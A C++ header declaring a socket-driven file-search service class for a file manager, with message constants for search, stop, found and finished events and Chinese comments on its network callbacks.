#pragma once
#include "EventHandler.h"

#define FILEMGR_SEARCH			('S'|('R'<<8)|('C'<<16)|('H'<<24))

#define FILE_MGR_SEARCH_SEARCH		(0xaca1)

#define FILE_MGR_SEARCH_STOP		(0xaca2)

#define FILE_MGR_SEARCH_FOUND		(0xaca3)

#define FILE_MGR_SEARCH_OVER		(0xaca4)

class CFileMgrSearchDlg;

class CFileMgrSearchSrv :
	public CEventHandler
{
private:
	CFileMgrSearchDlg*	m_pDlg;

public:
	void OnClose();					//当socket断开的时候调用这个函数
	void OnConnect();				//当socket连接的时候调用这个函数
	//有数据到达的时候调用这两个函数.
	void OnReadPartial(WORD Event, DWORD Total, DWORD nRead, char*Buffer);
	void OnReadComplete(WORD Event, DWORD Total, DWORD nRead, char*Buffer);
	//有数据发送完毕后调用这两个函数
	void OnWritePartial(WORD Event, DWORD Total, DWORD nWrite, char*Buffer);
	void OnWriteComplete(WORD Event, DWORD Total, DWORD nWrite, char*Buffer);


	void OnFound(char*Buffer);
	void OnOver();

	void Search(WCHAR*szParams);
	void Stop();

	CFileMgrSearchSrv(DWORD dwIdentity);
	~CFileMgrSearchSrv();
};

